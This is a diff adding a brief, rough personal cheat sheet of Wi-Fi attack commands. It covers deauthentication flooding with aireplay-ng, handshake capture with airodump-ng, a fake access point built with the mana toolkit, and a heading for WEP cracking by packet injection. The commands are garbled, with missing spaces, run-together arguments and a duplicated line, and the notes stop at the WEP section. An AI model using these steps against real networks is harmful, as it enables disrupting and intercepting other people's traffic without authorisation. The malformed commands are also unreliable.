@@ -1,0 +1,18 @@
+deauthantication attacks!!
+airodump-ng --channel 2--bssid (mac adress) mon0
+aireplay-ng--deauth 10000-a(mac-adress)
+client mac adress mon0
+
+/*creating a fake access point*/
+wifi card
+install mana toolkit
+leafpad/etc/'mana-toolkit/hostapd-mana'.conf    /*=>'is the location'*/
+leafpad /usr/share/mana -toolkit/run-mana/start-nat-simple.sh
+leafpad /usr/share/mana -toolkit/run-mana/start-nat-simple-sh
+
+GAINING ACCESS TO ENCRYPTED NETWORKS
+airodump -ng mon0
+airodump-ng--bssid(adress) --channel(2)--write(basic-test-ap-ol.cap)
+
+WEP CRACKING PACKET INJECTION
+airodump-ng--bssid 00:10:18:90:2D:EE--channel 2 mon0
